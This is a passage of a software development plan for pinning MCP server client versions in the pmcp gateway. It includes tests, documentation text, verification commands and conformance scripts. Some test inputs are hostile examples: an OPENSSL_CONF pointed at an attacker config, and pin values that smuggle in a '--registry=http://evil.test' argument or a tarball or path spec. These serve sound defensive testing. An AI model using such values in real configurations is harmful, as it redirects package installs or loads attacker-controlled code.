    """Round 7 B1: gateway.provision spawns `install[platform]` and adopts it as
    the live server, so a hand-pinned `args` with a copied unpinned install
    argv ran latest while the warning judged only `args`."""
    server = _server("fc", ["-y", "fc-mcp@3.25.5"])
    server.install = {**server.install, "linux": install}
    gateway = _gateway(monkeypatch, tmp_path, {"fc": server}, online=["fc"])

    health = await gateway.health()

    (info,) = [s for s in health.servers if s.name == "fc"]
    assert len(info.warnings) == 1
    assert "cannot verify" in info.warnings[0]
    assert "its linux install argv" in info.warnings[0]
    assert named in info.warnings[0]


@pytest.mark.asyncio
async def test_update_server_never_labels_a_divergent_install_argv_pinned(
    monkeypatch: pytest.MonkeyPatch, tmp_path: Path, npm_tables: None
) -> None:
    from pmcp.cli import _format_update_result

    server = _server("fc", ["-y", "fc-mcp@3.25.5"])
    server.install = {**server.install, "linux": ["npx", "-y", "fc-mcp"]}
    gateway = _gateway(monkeypatch, tmp_path, {"fc": server})
    _latest(monkeypatch, "3.26.0")
    _no_probe(monkeypatch, gateway)

    result = await gateway.update_server({"server_name": "fc"})

    assert (result.pinned_version, result.floating_selector) == (None, "3.25.5")
    assert "its linux install argv" in result.message
    assert _format_update_result(result.model_dump())[0].startswith("[FLOATING] fc")


@pytest.mark.parametrize(
    ("env_var", "relaxers", "env"),
    [
        (
            "OPENSSL_CONF",
            ["SELFHOST_API_URL"],
            {"OPENSSL_CONF": "/srv/evil.cnf", "SELFHOST_API_URL": "http://h"},
        ),
        ("SELFHOST_API_KEY", ["OPENSSL_CONF"], {"OPENSSL_CONF": "/srv/evil.cnf"}),
        (
            "TARGET_CC",
            ["SELFHOST_API_URL"],
            {"TARGET_CC": "/srv/cc", "SELFHOST_API_URL": "http://h"},
        ),
    ],
    ids=["env-var-openssl-conf", "relaxer-openssl-conf", "env-var-target-cc"],
)
@pytest.mark.asyncio
async def test_an_overlay_declaration_exempts_no_key(
    env_var: str,
    relaxers: list[str],
    env: dict[str, str],
    monkeypatch: pytest.MonkeyPatch,
    tmp_path: Path,
    npm_tables: None,
) -> None:
    """Round 7 B2: an overlay-only entry that names a loader key as its own
    credential or relaxer gets no exemption: only pmcp's shipped manifest
    declares keys (reproduced: OPENSSL_CONF made npx load an arbitrary .so)."""
    server = ServerConfig(
        name="overlay-only",
        description="x",
        keywords=["x"],
        install={p: ["npx", "-y", "fc-mcp@3.25.5"] for p in PLATFORMS},
        command="npx",
        args=["-y", "fc-mcp@3.25.5"],
        requires_api_key=True,
        env_var=env_var,
        api_key_optional_when=relaxers,
        extra_env=env,
    )

    warnings = await _one_warning(monkeypatch, tmp_path, server)

    assert len(warnings) == 1
    assert "cannot verify" in warnings[0]
    assert "the entry's env sets" in warnings[0]


@pytest.mark.asyncio
async def test_the_shipped_firecrawl_declarations_keep_a_self_hosted_pin_silent(
    monkeypatch: pytest.MonkeyPatch, tmp_path: Path, npm_tables: None
) -> None:
    """Control, against the REAL shipped declarations: firecrawl's own
    FIRECRAWL_API_KEY and FIRECRAWL_API_URL are exempt (the
    ViperJuice/dotfiles#325 shape)."""
    server = ServerConfig(
        name="firecrawl",
        description="x",
        keywords=["x"],
        install={p: ["npx", "-y", "firecrawl-mcp@3.25.5"] for p in PLATFORMS},
        command="npx",
        args=["-y", "firecrawl-mcp@3.25.5"],
        requires_api_key=True,
        env_var="FIRECRAWL_API_KEY",
        api_key_optional_when=["FIRECRAWL_API_URL"],
        extra_env={"FIRECRAWL_API_URL": "http://ai:3002", "FIRECRAWL_API_KEY": "k"},
    )

    assert await _one_warning(monkeypatch, tmp_path, server) == []


@pytest.mark.parametrize(
    ("command", "args"),
    [
        ("docker", ["run", "-it", "--rm", f"example/client@{_DIGEST}"]),
        ("npx", ["--yes=true", "fc-mcp@3.25.5"]),
    ],
    ids=["docker-it", "npx-yes-true"],
)
@pytest.mark.asyncio
async def test_common_inert_spellings_are_recognised(
    command: str,
    args: list[str],
    monkeypatch: pytest.MonkeyPatch,
    tmp_path: Path,
    npm_tables: None,
) -> None:
    """Round 7 N2: `docker run -it` and `npx --yes=true` are modelled."""
    assert (
        await _one_warning(monkeypatch, tmp_path, _launch("ok1", command, args)) == []
    )
```

## Documentation impact

- `README.md`: **modify**. Add a subsection, "Pinning a client version", right after
  the `server_env` / `api_key_optional_when` paragraph (search for
  `FIRECRAWL_API_URL: "http://localhost:3002"`). It covers:
  - the `server_version:` YAML shown in D2;
  - the exact-version-only rule and why ranges and dist-tags are refused;
  - npx only, and the `.mcp.json`/`.pmcp.json` explicit-args escape hatch for
    uvx/cargo/docker;
  - "a whole-entry `servers:` replace in a higher-precedence overlay drops a
    lower-precedence pin";
  - what `pmcp update` prints for a pinned server (`[PINNED] ...`), and for a range or tag (`[FLOATING] ...`);
  - that a new pin reaches a running server only on respawn, so run `gateway.refresh` after adding one;
  - that aliases, URLs, git/file specs and ranges in an entry's slot are refused (the pin could change the package);
  - the `gateway.health` warning for an unpinned self-hosted client;
  - (rev 6) that a docker tag floats and only an `@sha256` digest pins (`[FLOATING]` / `[PINNED]`);
  - (rev 6, narrowed in rev 7) that the warning says it **cannot verify** an exact pin when the server's own config injects a setting that can change what runs, and names the setting;
  - (rev 7) the trust boundary, as the paragraph below.

  The README subsection **must** include this trust-boundary paragraph (verbatim, or
  equivalent):

  > **What the pin warning checks, and what it trusts.** The `gateway.health` warning
  > judges what the server's config controls. It is silent for a self-hosted server
  > only when all of these are **proven** inert; anything it does not recognise makes it
  > say it *cannot verify* the pin:
  >
  > - **The launch shape.** pmcp recognises `npx [-y] pkg@X [args]`, `npm exec`, `uvx
  >   pkg==X [args]` or `uvx --from pkg==X pkg [args]` (also `uv tool run`), `cargo
  >   install crate --version X`, and `docker run [-i -t --rm ...] [-e KEY] image@sha256:...`
  >   with **nothing after the image**. A docker digest pins the *image*, not what runs
  >   in it: a container command, `--entrypoint`, a mount or an env file can run
  >   anything. A docker tag is never a pin.
  > - **The `env` the config injects** (for example an overlay's `server_env`). Only
  >   the keys pmcp's **shipped** manifest declares for that server (its credential and
  >   self-hosting variables; a declaration in your overlay or `.pmcp.json` does not
  >   count), locale/terminal keys, and a few npm/uv/cargo logging, timing and
  >   credential keys are allowed. Anything else, including keys pmcp does not know, is
  >   "cannot verify".
  > - **A `cwd` the config sets**, for an npx, uvx or cargo client: it picks which
  >   project's `.npmrc`, `uv.toml` or `.cargo/config.toml` applies.
  > - **Every argv that can start the server.** For a manifest server that means its
  >   `args` *and* each platform's `install` argv, which `gateway.provision` runs and keeps
  >   as the live server; each must run the same exact pin in a recognised shape.
  > - **The launcher.** `bunx`, `pnpx`, `pnpm dlx`, `yarn dlx`, `uv run`, `node`, shells and
  >   `env` wrappers are "cannot verify", pinned or not. Any other command (a locally
  >   installed server binary) is not judged.
  >
  > It trusts your machine: npmrc files at any level, your shell environment,
  > version-manager shims (asdf, Volta, mise), the npx cache and global bin, proxy/CA
  > settings, and uv, cargo and docker configuration are yours to control, and pmcp does
  > not inspect them. A pin holds the top-level package; its dependencies still resolve
  > from their ranges, and an injected `npm_config_@<scope>:registry` for a
  > *dependency's* scope is allowed and not reported. Some harmless spellings still warn
  > because pmcp does not parse them (`docker container run`, `uvx -qq`, `cargo install
  > -fq`, `cargo install fc@1.2.3`); use `docker run`, `-q`, `-f`, and `--version`. An
  > overlay-only self-hosted server (one pmcp does not ship) always warns "cannot verify":
  > its own variables are not declared by the shipped manifest.

  In the gateway-tools table row for `gateway.update_server`, mention that a pinned
  server is reported with the newer version that is available. The existing README
  sentence that `.mcp.json` pinning is "the supported override channel" stays true.
  Add "or `server_version` for a manifest server" to it.
- `CHANGELOG.md`: **modify**. Under `## [Unreleased]`, add an `### Added` entry in the
  house style (bold lead sentence, then detail, then
  `See [#294](https://github.com/Consiliency/pmcp/issues/294).`). Suggested text:

  > - **Pin a built-in server's client version with one overlay line, and see when
  >   a newer one exists.** A manifest entry takes `version: "X.Y.Z"`, and an overlay's
  >   new `server_version:` map sets it on a shipped entry without restating its install
  >   matrix. The pin is written into the npx package slot of `args` and of every
  >   `install` argv, keeping the entry's own package name, so an overlay can choose a
  >   version and never a different package. Only one exact SemVer version is accepted:
  >   ranges and dist-tags such as `latest` re-resolve at every spawn and are refused.
  >   uvx/pip/cargo/docker and remote entries are refused with a message pointing at
  >   `.mcp.json` explicit args. `pmcp update` prints a pinned server as `[PINNED]
  >   firecrawl: pinned at 3.25.5, newer available: 3.26.0` instead of `[FAILED]`, and
  >   `gateway.update_server` returns `pinned_version`, `latest_available` and
  >   `latest_comparison`. `gateway.health` and `gateway.update_server` now also carry a
  >   `warnings` list, which warns when an entry's `api_key_optional_when` relaxer is
  >   active (a self-hosted backend is configured) and its client is unpinned. See
  >   [#294](https://github.com/Consiliency/pmcp/issues/294).
- `CONTRIBUTING.md`: **modify**. In the manifest-entry example (the
  `api_key_optional_when` comment block around line 70), add one commented line:
  `# Optional: version: "1.2.3"   # exact client pin; npx entries only (see README)`.
- `src/pmcp/manifest/manifest.yaml`: **no change**. No shipped entry is pinned by this
  plan. Shipping a pin for firecrawl would pin every vendor-hosted user too. See open
  question Q1.
- No `docs/**`, `llms*.txt`, `SECURITY.md` or openapi footprint: the new fields are
  optional output fields, and no input schema changes.

## Dependencies & order

1. `types.py` fields first. `handlers.py` constructs them, and without them `mypy src/`
   fails.
2. `loader.py`: grammar, materialiser and overlay map. This is independent of handlers.
3. `handlers.py`: the warning helper, health, the update wrapper and the pinned branch.
4. `cli.py`: the renderer.
5. `tests/test_version_pin.py`, then the docs.

External blockers: none. There is no migration, and the new fields are additive and
optional.

## Follow-up slices (sequenced after this plan; design notes only, not planned)

### Slice 3: optional post-update smoke probe (proposal 3)

- **Manifest shape.** An optional
  `smoke_probe: {tool: "firecrawl_search", arguments: {query: "example domain", limit: 1}}`
  on an entry, which an overlay can set via a `server_smoke_probe:` patch map. It follows
  the same "patch an existing server, cannot create" rule as `server_env`/`server_version`.
- **When it runs.** Only after `gateway.update_server` has actually restarted the server
  onto a new version (`restart_result.ok`), and never on a pinned no-op.
- **What counts as a failure (from the 2026-09-26 measurement).** The self-hosted search
  returned an empty `success:true` in **1 of 6** identical requests with no client
  involved. So the probe must assert only "the call did not return a JSON-RPC error, an
  `isError: true` tool result, or an HTTP 4xx/5xx in its text". It must **never** assert
  that results are non-empty. On failure it retries once, and only a second failure is
  attributed to the version change.
- **Report.** The message names the previous and the new client versions. The previous
  version comes from what the update resolved before the probe. For a manifest npm
  entry, a failure message can suggest the exact
  `server_version: {name: <previous>}` line, because this plan makes that a one-line
  rollback. Automatic rollback is out of scope: it would rewrite the operator's overlay
  file.

### Slice 4: client version in error hints (proposal 4)

- **What exists, measured.** There is none. `grep -rn "installed_version\|resolve_spawned_version" src/pmcp` finds nothing. The
  spawn-time-provenance plan
  (`.consiliency/plans/detailed-spawn-time-version-provenance-20260817-1800.md`) was
  not implemented: automatic update notices were removed instead (Consiliency/pmcp#150,
  quoted at `handlers.py` in `update_server`: "pmcp cannot observe which artifact a
  running server executes").
- **What this plan makes possible.** For a **pinned** npx argv, the argv itself names
  the version that ran. No inference is needed, because `_detect_effective_version_pin`
  on the spawned config is the answer. Slice 4 can therefore record, at connect time on
  `ManagedClient`, the `(package, pinned_version | "unpinned")` pair read from the argv
  it spawned. When a downstream tool result is a 4xx/schema-validation error (the
  `400 Invalid request body` class), it adds `client firecrawl-mcp@3.25.5 (pinned)` or
  `client firecrawl-mcp (unpinned: whatever npx resolved at spawn)` to
  `gateway.invoke`'s `errors`/`feedback_hint`. Naming an *unpinned* client's exact
  version is the #150 problem again and stays out of scope. The hint says so and names
  the `server_version` remedy.

## Verification

**Prerequisites** (memory: `worktree-needs-uv-sync-p310`):

- Run `uv sync -p 3.10 --all-extras` in the worktree. A bare `uv sync` leaves out
  ruff, mypy and pytest-timeout, and resolves to the system Python.
- Run **`unset npm_config_cache npm_config_store_dir pnpm_config_store_dir` in the same
  shell command** as every pytest invocation. With them set, the npm resolver is
  DISABLED by design, and every npm server reads as `unknown`. The pin tests would then
  go red for the wrong reason.

All steps below were run this session against the spike (the diff and test file above),
on Python 3.10.12 via `uv run`. The expected results are the measured ones.

```bash
cd "$WORKTREE"   # a fresh worktree off origin/main, with the diff + test file applied

# 0. The new tests exist.
uv run pytest tests/test_version_pin.py --collect-only -q --cov-fail-under=0 | tail -1
#   -> 230 tests collected   (rev 9; rev 8: 219; rev 7: 190; first rev-7 cut: 186; rev 6: 153; rev 5: 112)

# 1. Red on HEAD (before the diff; the test file alone).
unset npm_config_cache npm_config_store_dir pnpm_config_store_dir; \
  uv run pytest tests/test_version_pin.py -q --cov-fail-under=0 --tb=line | tail -1
#   -> ImportError: cannot import name 'manifest_sources_fingerprint' from 'pmcp.manifest.loader' -- 1 error during collection
#      (rev 3: the file imports manifest_sources_fingerprint and split_plain_registry_spec,
#      which HEAD lacks, so collection itself is red; the per-test red evidence is the
#      rev-1/rev-2 spike runs below and in the Revision tables)
#   rev 2 was: 56 failed, 1 passed   (the 1 is test_explicit_config_args_win_over_the_manifest_pin,
#      an inertness guard that is green on HEAD by design)
#   Against the REVISION-1 spike: 19 failed, 38 passed; exactly the 19 new rev-2 cases
#   (Revision 2 table).
#   Rev 9: against the REVISION-8 code (253445a): 11 failed, 219 passed.
#   Rev 8: against the REVISION-7 code (15dae94): 24 failed, 195 passed.
#   Rev 7 (cwd ruling): against the FIRST rev-7 cut (1073923): 3 failed, 187 passed.
#   Rev 7: the first rev-7 file against the REVISION-6 code: 54 failed, 132 passed (Rev 6
#   board findings section).
#   Rev 6: the revision-6 file against the REVISION-5 code: 41 failed, 112 passed (the 39
#   new red cases plus the two changed NB-2 texts; Revision 6 section).
#   Rev 5 on 959d4d4 WITHOUT the patch: collection ImportError; with a two-symbol import
#   shim, 111 failed, 1 passed (test_explicit_config_args_win_over_the_manifest_pin).
#   Against the REVISION-3 spike: 18 failed, 89 passed -- the 18 rev-4 cases red, and
#   every rev-3 test green on the buggy code (Revision 4 table).
#   Against the REVISION-2 spike: 15 failed, 74 passed (Revision 3 table; measured with a
#   one-line import shim, because rev 2 has no public split_plain_registry_spec).

# 2. Green with the diff.
unset npm_config_cache npm_config_store_dir pnpm_config_store_dir; \
  uv run pytest tests/test_version_pin.py -q --cov-fail-under=0 | tail -1
#   -> 230 passed   (rev 9; rev 8: 219; rev 7: 190; first rev-7 cut: 186; rev 6: 153; rev 5: 112)

# 3. CI gates (all three are in .github/workflows).
uv run ruff check src/ tests/                 # -> All checks passed!
uv run ruff format --check src/ tests/        # -> 166 files already formatted   (rev 7 on 876fd33; 164 on 959d4d4)
uv run mypy src/                              # -> Success: no issues found in 51 source files   (rev 7 on 876fd33; 50 on 959d4d4)

# 4. The neighbouring suites that own the touched contracts.
unset npm_config_cache npm_config_store_dir pnpm_config_store_dir; \
  uv run pytest tests/test_version_pin.py tests/test_manifest_overlay.py \
    tests/test_project_source_consent_manifest.py tests/test_pkgid_panel_fixes.py \
    tests/test_package_identity_gate.py tests/test_credential_gates_handlers.py \
    tests/test_credential_gates_startup.py tests/test_credential_optionality_e2e.py \
    tests/test_manifest_provision.py tests/test_version_checker.py \
    tests/test_credential_predicate_guard.py tests/test_package_identity.py \
    tests/test_policy_package_identifiers.py tests/test_package_approvals.py \
    tests/test_gateway_tool_schemas.py -q --cov-fail-under=0 | tail -1
#   -> 2048 passed, 19 deselected   (rev 7; rev 6: 2015; rev 5: 1974, on 959d4d4, adding #299's and #300's test files; rev 4: 1686, which ALSO runs tests/test_package_identity.py and
#      tests/test_policy_package_identifiers.py -- the other callers of is_valid_package_version;
#      rev 3: 1620; rev 2: 1588)

# 5. Whole suite: Bash run_in_background, wait for the notification. Do not detach with
#    nohup/disown. Use a lane-unique log path.
unset npm_config_cache npm_config_store_dir pnpm_config_store_dir; \
  uv run pytest tests/ -q --cov-fail-under=0 -p no:cacheprovider -m 'not live and not slow' > "$LOGDIR/294-suite.log" 2>&1
#   -> 4583 passed, 3 skipped, 25 deselected in 464.14s (0:07:44)   (rev 9 on 876fd33; rev 8: 4572 passed in 729.81s, run concurrently with the mutants; rev 7 incl. the cwd ruling on 876fd33: 4543 passed in 457.95s; first rev-7 cut on 876fd33: 4539 passed in 453.66s; on 959d4d4: 4522 passed in 453.77s; marker `-m 'not live and not slow'`; rev 6: 4489 passed in 456.55s; rev 5: 4448 passed in 443.28s; board revision 4: 4178 passed in 427.75s; revision 3: 4160 passed in 442.33s; revision 2: 4128 passed, 3 skipped, 25 deselected in 422.12s; earlier: 4108 passed; the first spike was 1 failed / 4107 passed -- see the mutation-table note;
#      revision 3 adds only the offline stub in test_pkgid_panel_fixes.py, re-measured by step 5b)

# 5b. Hermeticity: no update_server/health test may reach a real registry. The plugin
#     makes every registry lookup raise; run it over the files that drive either tool.
mkdir -p "$LOGDIR/plug" && cat > "$LOGDIR/plug/nonet.py" <<'PY'
import pmcp.manifest.version_checker as vc
async def _boom(*a, **k):
    raise RuntimeError("NETWORK-LOOKUP")
for n in ("get_npm_version", "get_pypi_version", "get_cargo_version", "get_docker_version"):
    setattr(vc, n, _boom)
PY
F=$(grep -rln --include='*.py' "update_server(\|\.health()\|gateway.health" tests/ | grep -v harness.py | sort | tr '\n' ' ')
unset npm_config_cache npm_config_store_dir pnpm_config_store_dir; \
  PYTHONPATH="$LOGDIR/plug" uv run pytest ${=F} -q --cov-fail-under=0 -p nonet -p no:cacheprovider | tail -1
#   (zsh: ${=F} word-splits; in bash use $F)
#   -> 1227 passed, 1 deselected over 20 files (rev 7; rev 6: 1194; rev 5: 1153 on 959d4d4; board revision 4: 928; 910 in revision 3, 878 in revision 2, 858 in revision 1, measured with the stub). The spike WITHOUT the panel-fixes stub gave
#      "1 failed, 857 passed, 1 deselected" (the one offender named above); with the stub,
#      the offender and tests/test_version_pin.py pass under the plugin (84 passed for those
#      two files). On HEAD, the 6-file update_server subset gives 357 passed, 0 lookups.

# 6. The pre-existing pinned-refusal assertion still holds (substring kept; now stubbed offline).
unset npm_config_cache npm_config_store_dir pnpm_config_store_dir; \
  uv run pytest "tests/test_pkgid_panel_fixes.py::test_update_server_still_refuses_a_pinned_manifest_server_as_before" -q --cov-fail-under=0 | tail -1
#   -> 1 passed

# 7. Coverage of the shipped manifest (read-only; shows which built-ins can be pinned).
uv run python - <<'EOF'
from dataclasses import replace
from pathlib import Path
from pmcp.manifest.loader import load_manifest, _materialize_version_pin
m = load_manifest(Path("src/pmcp/manifest/manifest.yaml"))
res = {n: _materialize_version_pin(replace(s, version="1.0.0")).version for n, s in m.servers.items()}
print(sum(v is not None for v in res.values()), "pinnable,", sum(v is None for v in res.values()), "refused")
assert res["firecrawl"] == "1.0.0"
EOF
#   -> 77 pinnable, 30 refused   (re-measured rev 9: shipped_cost.py incl. install argvs and shipped-only declarations, 0 of 77 on rev 9 and on rev 8; rev 8: shipped_cost.py: 0 of 77 exact pins not silent on rev 8 and on rev 7; rev 7 after the cwd ruling, rev 7 and rev 6; 19 uvx, 9 remote/empty command, cloudflare (url), context7 (windows `cmd /c npx`))

# 8. Mutation table below: each mutant applied to the implemented tree, then
#    `uv run pytest tests/test_version_pin.py -q --tb=line`, then restored and `cmp`-verified.

# 9. Plan-only commit check (for THIS planning commit, not the implementation PR).
git diff --stat 9ca081e -- src/ tests/          # -> empty
uv run python ~/code/pmcp/scripts/check_plan_consistency.py .consiliency/plans/detailed-294-version-pin-*.md
#   -> lane-contracted: 0   EC-proved node ids: 0 / consistent / blocking inconsistencies: 0
#      (vacuous for a detailed plan: it has no lane table or EC ids; run for the record)
```

```bash
# 10. GENERATED conformance against npm's own classifier, run ONCE PER npm-package-arg
#     release (rev 5: 12.0.2 = npm 10, 13.0.2 = npm 11; needs node; not a CI gate).
#     The generator is adapted from the board-round-3 seat's; both files are below.
#     Rev 5 adds core parts at and past 2**53-1 and the npm-10 `tar-gz`/`tarXgz` suffixes.
for NPA in <npm10-root>/node_modules/npm-package-arg <npm11-root>/node_modules/npm-package-arg; do
  NPA=$NPA uv run python corpus_conformance.py <dir-with-npa_classify.js>   # exits nonzero on any violation
done
#   npa 12.0.2 -> SLOT corpus: 1617455 slots; accepted 14651 {'range': 25, 'tag': 14250, 'version': 376}
#                 refused 1602804; SLOT VIOLATIONS: 0
#                 PIN-VALUE corpus: 41472 values; accepted 12; PIN VIOLATIONS: 0          exit 0
#   npa 13.0.2 -> SLOT corpus: 1617455 slots; accepted 14651 {'range': 25, 'tag': 14250, 'version': 376}
#                 refused 1602804; SLOT VIOLATIONS: 0
#                 PIN-VALUE corpus: 41472 values; accepted 12; PIN VIOLATIONS: 0          exit 0
#   (The per-class refused counts differ between the two npa releases, because npa
#    classifies refused slots differently; the accepted set and both violation counts do not.)
#   The REVISION-4 rule (its own tarball regex, no 2**53-1 bound) on the same corpus:
#     npa 12.0.2: SLOT VIOLATIONS 4525 (4475 `file`, all `tar-gz`-shaped; 50 invalid), PIN 13
#     npa 13.0.2: SLOT VIOLATIONS 50 (EINVALIDTAGNAME: oversized core + build), PIN 10
#   Main's rule (#299) closes both; the pin grammar inherits it.
#   ~25 s per run (one node process classifies all slots).
#   Rev 6, rev 7 and rev 8 re-ran both (loader.py is unchanged from rev 5): identical lines, exit 0 on both.

# 11. Embedding proof (rev 6). Extract the reference patch (the first ```diff block after
#     "### Production diff") and the test file (the first ```python block after "## Test
#     bodies") from THIS file, then:
git -C <clone at origin/main 959d4d4> apply --check <extracted.patch>   # -> clean
cmp <extracted.patch> <(git -C <spike> diff -- src/ tests/test_pkgid_panel_fixes.py)   # -> identical
cmp <extracted test file> <spike>/tests/test_version_pin.py              # -> identical
#   Measured rev 7: all three clean on 959d4d4, and `git apply --check` clean on the re-fetched
#   origin/main 876fd33, where the applied tree's `git diff` is byte-identical to the patch.

# 12. Board-round-4 before/after (rev 6): repro_c1.py / repro_c2.py (appendix) against a
#     959d4d4 + rev-5 tree and a 959d4d4 + rev-6 tree; results in the
#     "Rev 5 board findings -- before/after, measured" section.
```

`npa_classify.js`:

```javascript
// Classify each slot with npm's own npm-package-arg: [type, name, registry, fetchSpec].
// NPA must point at the host npm's node_modules/npm-package-arg.
const npa = require(process.env.NPA);
const slots = JSON.parse(require("fs").readFileSync(0, "utf8"));
const out = [];
for (const s of slots) {
  try {
    const r = npa(s, "/tmp");
    out.push([r.type, r.name || null, !!r.registry, r.fetchSpec == null ? null : String(r.fetchSpec)]);
  } catch (e) {
    out.push(["ERROR:" + (e.code || e.message.slice(0, 40)), null, false, null]);
  }
}
console.log(JSON.stringify(out));
```

`corpus_conformance.py`:

```python
"""Generated corpus vs npm's real classifier (npm-package-arg).

Adapted from the board-round-3 claude seat's generator (Consiliency/pmcp#295).
Run it once per npm-package-arg release (NPA=<path>); rev 5 runs 12.0.2 (npm 10,
unescaped `tar.gz` in isFileType) and 13.0.2 (npm 11). Includes core parts at and
past 2**53-1, which node-semver refuses (npa then reads a dist-tag).
names x (prefixes x cores x suffixes) sampling npa's grammar -- every spec class,
versions with prerelease/build/tarball tails, case and unicode variants, any run
of leading v/=, reserved names, whitespace, fragments. Two checks, both must be 0:

1. SLOT: every slot split_plain_registry_spec accepts is fetched by npm from the
   registry as the SAME name, and is npa `version` or `tag` (or a bare name,
   npa range `*`). A range with a selector counts as a violation too.
2. PIN VALUE: every value _parse_version_pin accepts, placed as `x@<value>`, is npa
   `version` from the registry with fetchSpec == value (so the pin names exactly
   that registry version).
"""
import itertools, json, os, subprocess, sys
from collections import Counter
from pmcp.manifest.loader import _parse_version_pin, split_plain_registry_spec

here = sys.argv[1]
names = ["firecrawl-mcp", "t", "x", "v1", "latest", "Foo", "a.b", "a_b", "0x",
         "corp.tgz", "corp.TGZ", "x.tar", "a.TAR.GZ", "a.tar.gzz", "atgz", "a.tgz.x",
         "@s/p", "@S/P", "@s/p.tgz", "@s.tgz/p", "@s/p.tar.gz",
         "node_modules", "Node_Modules", "favicon.ico", "FAVICON.ICO", "http", "a..b",
         "ａ", "é", "a b", "-y", "_x", ".x", "github", "npm", "file", "git", "C", "c"]
cores = ["", "1", "1.2", "1.2.3", "3.25.5", "01.2.3", "1.2.3.4",
         "9007199254740991.0.0", "9007199254740992.0.0", "1.9007199254740992.0", "x", "X", "*", "x.x", "1.x",
         "1.X.x", "latest", "next", "beta", "rc", "a", "tgz", "tar", "corp", "corp-mcp", "v",
         "vnext", "vx", "Ｘ", "ｘ", "вeta", "é", "ß", "İ", "K", "ﬁ"]
pre = ["", "v", "V", "vv", "vvv", "=", "=v", "v=", "~", "^", ">=", "<", "npm:", "file:", "./",
       "../", "~/", "/", "C:", "c:", "github:", "gitlab:", "git+", "git+https://", "https://",
       "http://", "git@h.com:", "a/", " ", "\t"]
suf = ["", "-rc", "-rc.1", "-corp.tgz", "-x.TAR", "-a.tar.gz", "-X.Tar.Gz", "+b", "+b.tgz",
       "+b.tar.gz", "-x.tar-gz", ".tar-gz", ".tarXgz", ".tgz", ".TGZ", ".Tgz", ".tar", ".tar.gz", ".TAR.GZ", ".tar.gzip", ".tgzx",
       "beta", "-beta", "xbeta", ".xbeta", "#frag", ".tgz#frag", "#semver:1", "/x", "\n", " ",
       ":x", ".git", "@1", "%20", "!", "(1)", "\u200b", "İ"]
sels = sorted({p + c + s for p, c, s in itertools.product(pre, cores, suf)})
slots = set()
for n in names:
    slots.add(n)
    for sel in sels:
        slots.add(f"{n}@{sel}")
slots |= {"x@", "@@x", "@s/p@", "x@@1", "x@1@2", "x@npm:y@1", "y@npm:x", "x@1.2.3 ",
          " x@1.2.3", "x@1.2.3\n", "x@\n", "X@1.0.0", "x@1.0.0-ｘ.tgz", "x@1.0.0-x.tgz\n"}
slots = sorted(slots)
pins = sels  # every generated selector is also tried as a pin VALUE

env = dict(os.environ, NPA=os.environ["NPA"])
def classify(items):
    out = subprocess.run(["node", f"{here}/npa_classify.js"], input=json.dumps(items),
                         capture_output=True, text=True, check=True, env=env).stdout
    return json.loads(out)

res = classify(slots)
acc, ref, bad = Counter(), Counter(), []
for s, (t, nm, reg, _fetch) in zip(slots, res):
    ours = split_plain_registry_spec(s)
    if ours is None:
        ref[t] += 1
        continue
    acc[t] += 1
    ok = reg and nm == ours[0] and (t in ("version", "tag") or (t == "range" and ours[1] is None))
    if not ok:
        bad.append((s, t, nm, ours))
print(f"SLOT corpus: {len(slots)} slots; accepted {sum(acc.values())} {dict(sorted(acc.items()))}")
print(f"  refused {sum(ref.values())} by npa class {dict(sorted(ref.items()))}")
print(f"  SLOT VIOLATIONS (accepted, not a same-name registry version/tag/bare name): {len(bad)}")
for b in bad[:40]:
    print("    ", repr(b))

import logging
logging.disable(logging.WARNING)
accepted_pins = [v for v in pins if _parse_version_pin("x", v, "server_version") is not None]
pres = classify([f"x@{v}" for v in accepted_pins])
pbad = [(v, r) for v, r in zip(accepted_pins, pres) if not (r[0] == "version" and r[2] and r[3] == v)]
print(f"PIN-VALUE corpus: {len(pins)} values; accepted {len(accepted_pins)}; "
      f"PIN VIOLATIONS (accepted, not npa registry `version` == value): {len(pbad)}")
for b in pbad[:40]:
    print("    ", repr(b))
sys.exit(1 if bad or pbad else 0)
```

### Live check (optional, network, not a gate)

The operator can confirm the report end to end against the real registry:

```bash
unset npm_config_cache npm_config_store_dir pnpm_config_store_dir; uv run python - <<'EOF'
import asyncio
from pmcp.manifest.version_checker import get_package_version, compare_versions
v, t = asyncio.run(get_package_version("npx", ["-y", "firecrawl-mcp@3.25.4"], None, None, timeout=10))
print(v, t, compare_versions("3.25.4", v, t))
EOF
#   measured 2026-09-26: 3.25.5 npm newer
```

### Mutation table

Each mutant was applied to the spike with an exact one-occurrence string replace, then
confirmed by `diff` against the saved spike copy (the `diff` hunk header names the mutated
line). `tests/test_version_pin.py` was run with `--tb=line`, and the file was restored and
checked with `cmp` (`restored=True` for every row). The driver script is
`mutants.py`, embedded at the end of this plan.

| # | mutation | applied (file:diff hunk) | result | first `E` line (truncated at 160) / failing tests |
|---|---|---|---|---|
| M1 | grammar accepts any string | `loader.py:583c583` | **20 failed, 210 passed** (restored=True) | `AssertionError: assert '^3.25.5' is None`; `test_a_tarball_shaped_version_is_never_an_exact_pin`, `test_server_version_refuses_anything_but_one_exact_version["*"]`, `test_server_version_refuses_anything_but_one_exact_version["../../tmp/x"]`, `test_server_version_refuses_anything_but_one_exact_version["1.0.0-a.tar.gz"]`, `test_server_version_refuses_anything_but_one_exact_version["1.0.0-x.TAR"]`, `test_server_version_refuses_anything_but_one_exact_version["1.0.0-x.tar-gz"]`, `test_server_version_refuses_anything_but_one_exact_version["1.2.3-X.Tar.Gz"]`, `test_server_version_refuses_anything_but_one_exact_version["3.25"]`, `test_server_version_refuses_anything_but_one_exact_version["3.25.5 --registry=http://evil.test"]`, `test_server_version_refuses_anything_but_one_exact_version["3.25.5-evil.tgz"]` (+10 more) |
| M2 | install argv not pinned | `loader.py:747c747` | **3 failed, 227 passed** (restored=True) | `AssertionError: assert {'mac': ['npx...recrawl-mcp']} == {'mac': ['npx...-mcp@3.25.5']}`; `test_server_version_pins_the_shipped_firecrawl_entry_everywhere_it_spawns`, `test_version_key_on_a_whole_servers_entry_is_materialised`, `test_version_replaces_an_existing_tag_on_a_scoped_package` |
